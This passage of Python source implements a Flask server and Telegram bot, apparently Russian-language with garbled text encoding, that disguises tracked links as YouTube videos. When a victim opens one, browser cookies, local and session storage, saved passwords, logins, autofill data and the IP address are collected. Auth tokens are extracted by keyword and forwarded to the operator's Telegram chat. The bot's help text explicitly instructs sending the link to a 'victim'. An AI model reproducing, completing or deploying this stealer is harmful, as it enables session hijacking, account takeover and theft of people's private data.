        upload_date=video_info['upload_date'],
        comments_count=video_info['comments']
    )
    
    return html_content

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö —Å –∫–ª–∏–µ–Ω—Ç–∞"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
        
        link_id = data.get('link_id')
        data_type = data.get('data_type', 'unknown')
        encoded_data = data.get('data')
        
        if not link_id or not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ
        try:
            json_string = base64.b64decode(encoded_data).decode('utf-8')
            collected_data = json.loads(json_string)
        except Exception as e:
            logger.error(f"Error decoding data: {e}")
            return jsonify({'status': 'error', 'message': 'Decode error'}), 400
        
        # –ü–æ–ª—É—á–∞–µ–º IP –∞–¥—Ä–µ—Å
        ip_address = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å—ã –∏–∑ –¥–∞–Ω–Ω—ã—Ö
        identified_services = []
        
        # –ò–∑ cookies
        cookies = collected_data.get('cookies', {})
        cookies_list = [{'name': k, 'value': v} for k, v in cookies.items()]
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å—ã –∏–∑ cookies
        for cookie in cookies_list:
            name = cookie['name'].lower()
            value = cookie['value'].lower()
            
            # Google/YouTube
            if 'google' in name or 'youtube' in name or 'yt' in name:
                identified_services.append('google/youtube')
            
            # –°–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏
            if 'facebook' in name or 'fb_' in name:
                identified_services.append('facebook')
            if 'instagram' in name or 'ig_' in name:
                identified_services.append('instagram')
            if 'twitter' in name or 'auth_token' in name:
                identified_services.append('twitter/x')
            if 'vk' in name or 'vkontakte' in name:
                identified_services.append('vk')
            
            # –ü–æ–∏—Å–∫–æ–≤–∏–∫–∏
            if 'yandex' in name:
                identified_services.append('yandex')
            if 'bing' in name:
                identified_services.append('microsoft')
            
            # –†–∞–∑–Ω–æ–µ
            if 'sessionid' in name or 'token' in name or 'auth' in name:
                # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç —Å–µ—Ä–≤–∏—Å–∞
                if 'github' in value:
                    identified_services.append('github')
                if 'spotify' in value:
                    identified_services.append('spotify')
                if 'discord' in value:
                    identified_services.append('discord')
        
        # –ò–∑ User-Agent
        user_agent = collected_data.get('userAgent', '').lower()
        if 'iphone' in user_agent or 'ipad' in user_agent or 'ipod' in user_agent:
            device_type = 'iOS'
        elif 'android' in user_agent:
            device_type = 'Android'
        elif 'windows' in user_agent:
            device_type = 'Windows'
        elif 'mac' in user_agent:
            device_type = 'macOS'
        elif 'linux' in user_agent:
            device_type = 'Linux'
        else:
            device_type = 'Unknown'
        
        identified_services = list(set(identified_services))
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –¥–ª—è –±–∞–∑—ã
        data_id = str(uuid.uuid4())[:12]
        
        captured_data = {
            'id': data_id,
            'link_id': link_id,
            'timestamp': datetime.now().isoformat(),
            'ip_address': ip_address,
            'user_agent': collected_data.get('userAgent', ''),
            'cookies': cookies_list,
            'localStorage': collected_data.get('localStorage', {}),
            'sessionStorage': collected_data.get('sessionStorage', {}),
            'passwords': collected_data.get('passwords', []),
            'logins': collected_data.get('logins', []),
            'autofill_data': collected_data.get('autofillData', {}),
            'browser_info': collected_data.get('browserInfo', {}),
            'device_info': {
                'screen': collected_data.get('screen', {}),
                'platform': collected_data.get('platform', ''),
                'timezone': collected_data.get('timezone', ''),
                'device_type': device_type,
                'plugins': collected_data.get('plugins', []),
                'hasIndexedDB': collected_data.get('hasIndexedDB', False)
            },
            'sensitive_data': collected_data,
            'identified_services': identified_services
        }
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
        db.add_captured_data(captured_data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
        if telegram_app:
            import asyncio
            asyncio.run_coroutine_threadsafe(
                send_telegram_notification(captured_data),
                telegram_app._get_running_loop()
            )
        
        return jsonify({
            'status': 'success',
            'id': data_id,
            'message': 'Data collected successfully'
        })
        
    except Exception as e:
        logger.error(f"Error in collect_data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ========== TELEGRAM –§–£–ù–ö–¶–ò–ò ==========
async def send_telegram_notification(data):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram –æ –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    try:
        if not telegram_app:
            return
        
        link_info = db.get_link(data['link_id'])
        link_url = link_info['server_url'] if link_info else 'N/A'
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º cookies –¥–ª—è –ø–æ–∏—Å–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤
        sensitive_tokens = []
        for cookie in data.get('cookies', []):
            name = cookie.get('name', '').lower()
            value = cookie.get('value', '')
            
            # –ò—â–µ–º —Ç–æ–∫–µ–Ω—ã
            if any(keyword in name for keyword in ['token', 'session', 'auth', 'access', 'refresh', 'secret']):
                if len(value) > 20:  # –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º, —á—Ç–æ —ç—Ç–æ —Ç–æ–∫–µ–Ω
                    sensitive_tokens.append(f"{name}: {value[:30]}...")
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º LocalStorage
        localStorage_tokens = []
        localStorage_data = data.get('localStorage', {})
        for key, value in localStorage_data.items():
            key_lower = key.lower()
            if any(keyword in key_lower for keyword in ['token', 'auth', 'session', 'jwt', 'access']):
                if isinstance(value, str) and len(value) > 20:
                    localStorage_tokens.append(f"{key}: {value[:30]}...")
        
        message = f"""
üîê *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –°–û–ë–†–ê–ù–´!*

üìå *–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Å—Å–∏–∏:*
‚Ä¢ ID –¥–∞–Ω–Ω—ã—Ö: `{data['id']}`
‚Ä¢ ID —Å—Å—ã–ª–∫–∏: `{data['link_id']}`
‚Ä¢ –í—Ä–µ–º—è: {data['timestamp'][:19]}
‚Ä¢ IP: `{data['ip_address']}`
‚Ä¢ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: {data.get('device_info', {}).get('device_type', 'Unknown')}

üìä *–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}
‚Ä¢ –ü–ª–∞–≥–∏–Ω—ã –±—Ä–∞—É–∑–µ—Ä–∞: {len(data.get('device_info', {}).get('plugins', []))}

üåê *–û–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã:*
"""
        
        services = data.get('identified_services', [])
        if services:
            for service in services:
                message += f"‚Ä¢ {service}\n"
        else:
            message += "‚Ä¢ –ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã\n"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–∫–µ–Ω—ã –µ—Å–ª–∏ –µ—Å—Ç—å
        if sensitive_tokens:
            message += f"\nüîë *–ù–∞–π–¥–µ–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã –≤ Cookies ({len(sensitive_tokens)}):*\n"
            for token in sensitive_tokens[:3]:
                message += f"‚Ä¢ `{token}`\n"
        
        if localStorage_tokens:
            message += f"\nüóÇ *–ù–∞–π–¥–µ–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã –≤ LocalStorage ({len(localStorage_tokens)}):*\n"
            for token in localStorage_tokens[:3]:
                message += f"‚Ä¢ `{token}`\n"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º User-Agent
        user_agent = data.get('user_agent', '')
        if user_agent:
            message += f"\nüë§ *User-Agent:*\n`{user_agent[:80]}...`\n"
        
        stats = db.get_stats()
        message += f"""
üìà *–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã:*
‚Ä¢ –í—Å–µ–≥–æ –¥–∞–Ω–Ω—ã—Ö: {stats.get('total_captured', 0)}
‚Ä¢ Cookies: {stats.get('total_cookies', 0)}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /data {data['id']} - –î–µ—Ç–∞–ª–∏ –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /stats - –ü–æ–ª–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
"""
        
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
        
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {e}")

# ========== TELEGRAM –ö–û–ú–ê–ù–î–´ ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ /start"""
    user = update.effective_user
    
    welcome_message = f"""
üëã *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {user.first_name}!*

ü§ñ *YouTube Data Collector Bot*

üéØ *–ß—Ç–æ –¥–µ–ª–∞–µ—Ç —ç—Ç–æ—Ç –±–æ—Ç:*
1. –ü—Ä–∏–Ω–∏–º–∞–µ—Ç —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
2. –°–æ–∑–¥–∞–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—É—é —Å—Å—ã–ª–∫—É
3. –ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç - —Å–æ–±–∏—Ä–∞–µ—Ç –í–°–ï –¥–∞–Ω–Ω—ã–µ:
   ‚Ä¢ Cookies, LocalStorage, SessionStorage
   ‚Ä¢ –¢–æ–∫–µ–Ω—ã –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
   ‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
   ‚Ä¢ WebRTC –¥–∞–Ω–Ω—ã–µ
   ‚Ä¢ IP –∞–¥—Ä–µ—Å

‚ö° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /create_link –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ
2. –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
3. –ü–æ–ª—É—á–∏—Ç–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—É—é —Å—Å—ã–ª–∫—É
4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
5. –ü–æ–ª—É—á–∞–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏

üìä *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /create_link - –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /help - –ü–æ–º–æ—â—å

üîó *–°–µ—Ä–≤–µ—Ä:* {SERVER_URL}
"""
    
    keyboard = [
        [InlineKeyboardButton("üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É", callback_data="create_link")],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="stats")],
        [InlineKeyboardButton("üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")],
        [InlineKeyboardButton("üÜò –ü–æ–º–æ—â—å", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def create_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–°–æ–∑–¥–∞–Ω–∏–µ —Å—Å—ã–ª–∫–∏ —á–µ—Ä–µ–∑ Telegram"""
    await update.message.reply_text(
        "üîó *–°–æ–∑–¥–∞–Ω–∏–µ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º–æ–π —Å—Å—ã–ª–∫–∏*\n\n"
        "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ –≤ —Ñ–æ—Ä–º–∞—Ç–µ:\n"
        "`https://youtube.com/watch?v=VIDEO_ID`\n\n"
        "–ò–ª–∏ –ø—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å.",
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_youtube_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ YouTube URL"""
    text = update.message.text.strip()
    
    if not ('youtube.com' in text or 'youtu.be' in text):
        return
    
    user_id = update.effective_user.id
    
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ
    video_info = extract_youtube_video_info(text)
    video_id = YouTubeManager.extract_video_id(text)
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
    link_id = str(uuid.uuid4())[:12]
    
    # –°–æ–∑–¥–∞–µ–º URL –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ
    server_url = YouTubeManager.generate_server_url(video_id, link_id)
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
    link_data = {
        'id': link_id,
        'youtube_url': text,
        'youtube_id': video_id,
        'server_url': server_url,
        'created_at': datetime.now().isoformat(),
        'created_by': user_id,
        'title': video_info['title'],
        'description': video_info['description']
    }
    
    db.add_video_link(link_data)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    message = f"""
‚úÖ *–°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ!*

üé¨ *–í–∏–¥–µ–æ:* {video_info['title']}
üîó *–í–∞—à–∞ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º–∞—è —Å—Å—ã–ª–∫–∞:*
`{server_url}`

üìä *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—ã—à–µ
2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –µ—ë –∂–µ—Ä—Ç–≤–µ
3. –ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –æ—Ç–∫—Ä–æ–µ—Ç —Å—Å—ã–ª–∫—É, –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
4. –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç —Å—é–¥–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

üîê *–ß—Ç–æ –±—É–¥–µ—Ç —Å–æ–±—Ä–∞–Ω–æ:*
‚Ä¢ –í—Å–µ cookies –±—Ä–∞—É–∑–µ—Ä–∞ (–≤–∫–ª—é—á–∞—è —Ç–æ–∫–µ–Ω—ã)
‚Ä¢ LocalStorage –∏ SessionStorage
‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
‚Ä¢ WebRTC –¥–∞–Ω–Ω—ã–µ
‚Ä¢ IP –∞–¥—Ä–µ—Å

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /my_links - –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤—Å–µ –≤–∞—à–∏ —Å—Å—ã–ª–∫–∏
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
"""
    
    keyboard = [
        [InlineKeyboardButton("üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É", callback_data=f"copy_{link_id}")],
        [InlineKeyboardButton("üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É", url=server_url)],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å—Å—ã–ª–∫–∏", callback_data=f"stats_{link_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def my_links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ú–æ–∏ —Å—Å—ã–ª–∫–∏"""
    user_id = update.effective_user.id
    links = db.get_user_links(user_id)
    
    if not links:
        await update.message.reply_text(
            "üì≠ *–£ –≤–∞—Å –Ω–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫.*\n\n"
            "–ß—Ç–æ–±—ã —Å–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É:\n"
            "1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /create_link\n"
            "2. –ò–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ\n\n"
            "–ü—Ä–∏–º–µ—Ä: `https://youtube.com/watch?v=dQw4w9WgXcQ`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = "üîó *–í–ê–®–ò –°–°–´–õ–ö–ò:*\n\n"
    
    for i, link in enumerate(links[:10], 1):
        stats = db.get_link_stats(link['id'])
        
        message += f"{i}. *ID:* `{link['id'][:8]}...`\n"
        message += f"   üé¨ {link['title'][:50]}...\n"
        message += f"   üìÖ {link['created_at'][:10]}\n"
        message += f"   üë£ –ü–µ—Ä–µ—Ö–æ–¥–æ–≤: {stats['clicks']}\n"
        message += f"   üìä –î–∞–Ω–Ω—ã—Ö: {stats['captured']}\n"
        message += f"   üîó –°—Å—ã–ª–∫–∞: {link['server_url'][:50]}...\n"
        message += "   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
    
    if len(links) > 10:
        message += f"\n... –∏ –µ—â–µ {len(links) - 10} —Å—Å—ã–ª–æ–∫\n"
    
    keyboard = []
    for link in links[:3]:
        keyboard.append([
            InlineKeyboardButton(f"üìä {link['id'][:8]}...", callback_data=f"link_info_{link['id']}")
        ])
    
    keyboard.append([InlineKeyboardButton("‚ûï –°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É", callback_data="create_link")])
    
    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã"""
    stats = db.get_stats()
    
    message = f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ò–°–¢–ï–ú–´*

üîó *–û—Å–Ω–æ–≤–Ω—ã–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏:*
‚Ä¢ –°–æ–∑–¥–∞–Ω–æ —Å—Å—ã–ª–æ–∫: `{stats.get('total_links', 0)}`
‚Ä¢ –í—Å–µ–≥–æ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤: `{stats.get('total_clicks', 0)}`
‚Ä¢ –î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ: `{stats.get('total_captured', 0)}`
‚Ä¢ Cookies: `{stats.get('total_cookies', 0)}`
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: `{stats.get('total_credentials', 0)}`

üåê *–°–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ä–≤–µ—Ä–∞:*
‚Ä¢ –°—Ç–∞—Ç—É—Å: üü¢ –ê–∫—Ç–∏–≤–µ–Ω
‚Ä¢ URL: {SERVER_URL}
‚Ä¢ –ü–æ—Ä—Ç: {FLASK_PORT}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /create_link - –°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
‚Ä¢ /help - –ü–æ–º–æ—â—å
"""
    
    keyboard = [
        [InlineKeyboardButton("üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É", callback_data="create_link")],
        [InlineKeyboardButton("üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏", callback_data="my_links")],
        [InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å —Å–µ—Ä–≤–µ—Ä", url=SERVER_URL)]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö"""
    if not context.args:
        await update.message.reply_text(
            "üìä *–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `/data [ID_–¥–∞–Ω–Ω—ã—Ö]`\n\n"
            "–ü—Ä–∏–º–µ—Ä: `/data abc123def456`\n\n"
            "ID –¥–∞–Ω–Ω—ã—Ö –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    data_id = context.args[0]
    data = db.get_captured_data(data_id)
    
    if not data:
        await update.message.reply_text(
            f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{data_id}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # –ü–æ–∏—Å–∫ —Ç–æ–∫–µ–Ω–æ–≤ –∏ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    sensitive_info = []
    
    # Cookies
    for cookie in data.get('cookies', []):
        name = cookie.get('name', '').lower()
        if any(keyword in name for keyword in ['token', 'session', 'auth', 'secret', 'key', 'password']):
            value = cookie.get('value', '')
            if len(value) > 10:
                sensitive_info.append(f"üç™ {name}: {value[:50]}...")
    
    # LocalStorage
    localStorage = data.get('localStorage', {})
    for key, value in localStorage.items():
        key_lower = key.lower()
        if any(keyword in key_lower for keyword in ['token', 'auth', 'jwt', 'access', 'refresh']):
            if isinstance(value, str) and len(value) > 10:
                sensitive_info.append(f"üóÇ {key}: {value[:50]}...")
    
    message = f"""
üîç *–î–ï–¢–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢ –û –î–ê–ù–ù–´–•*

üìå *–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä:* `{data['id']}`
üïí *–í—Ä–µ–º—è —Å–±–æ—Ä–∞:* {data['timestamp'][:19]}
üåê *IP –∞–¥—Ä–µ—Å:* `{data['ip_address']}`
üñ• *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* {data.get('device_info', {}).get('device_type', 'Unknown')}
üë§ *User Agent:* {data['user_agent'][:80]}...

üìä *–°–û–ë–†–ê–ù–ù–´–ï –î–ê–ù–ù–´–ï:*
‚Ä¢ Cookies: {len(data.get('cookies', []))}
‚Ä¢ LocalStorage: {len(data.get('localStorage', {}))}
‚Ä¢ SessionStorage: {len(data.get('sessionStorage', {}))}
‚Ä¢ –ü–ª–∞–≥–∏–Ω—ã –±—Ä–∞—É–∑–µ—Ä–∞: {len(data.get('device_info', {}).get('plugins', []))}

üåê *–û–ü–†–ï–î–ï–õ–ï–ù–ù–´–ï –°–ï–†–í–ò–°–´:*
"""
    
    services = data.get('identified_services', [])
    if services:
        for service in services:
            message += f"‚Ä¢ {service}\n"
    else:
        message += "‚Ä¢ –ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã\n"
    
    # –ß—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    if sensitive_info:
        message += f"\nüîê *–ù–ê–ô–î–ï–ù–ù–´–ï –¢–û–ö–ï–ù–´ –ò –ö–õ–Æ–ß–ò ({len(sensitive_info)}):*\n"
        for info in sensitive_info[:5]:
            message += f"‚Ä¢ `{info}`\n"
        
        if len(sensitive_info) > 5:
            message += f"‚Ä¢ ... –∏ –µ—â–µ {len(sensitive_info) - 5}\n"
    
    # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–ª–∞–≥–∏–Ω–∞—Ö
    plugins = data.get('device_info', {}).get('plugins', [])
    if plugins:
        message += f"\nüß© *–ü–õ–ê–ì–ò–ù–´ –ë–†–ê–£–ó–ï–†–ê ({len(plugins)}):*\n"
        for plugin in plugins[:3]:
            message += f"‚Ä¢ {plugin.get('name', 'Unknown')}\n"
    
    message += f"""
üìç *–ì–ï–û–õ–û–ö–ê–¶–ò–û–ù–ù–´–ï –î–ê–ù–ù–´–ï:*
‚Ä¢ IP: `{data['ip_address']}`
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: {data.get('device_info', {}).get('timezone', 'Unknown')}
‚Ä¢ –Ø–∑—ã–∫: {data.get('browser_info', {}).get('language', 'Unknown')}

üì± *–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –£–°–¢–†–û–ô–°–¢–í–ï:*
‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: {data.get('device_info', {}).get('screen', {}).get('width', 'Unknown')}x{data.get('device_info', {}).get('screen', {}).get('height', 'Unknown')}
‚Ä¢ –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: {data.get('device_info', {}).get('screen', {}).get('colorDepth', 'Unknown')}
‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: {data.get('device_info', {}).get('platform', 'Unknown')}
"""
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        disable_web_page_preview=True
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await create_link_command(query, context)
    
    elif data == "stats":
        await stats_command(query, context)
    
    elif data == "my_links":
        await my_links_command(query, context)
    
    elif data == "help":
        help_message = """
üÜò *–ü–û–ú–û–©–¨ –ò –ò–ù–°–¢–†–£–ö–¶–ò–ò*

üéØ *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º—É:*
1. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –±–æ—Ç—É —Å—Å—ã–ª–∫—É –Ω–∞ YouTube –≤–∏–¥–µ–æ
   –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /create_link
2. –ë–æ—Ç —Å–æ–∑–¥–∞—Å—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º—É—é —Å—Å—ã–ª–∫—É
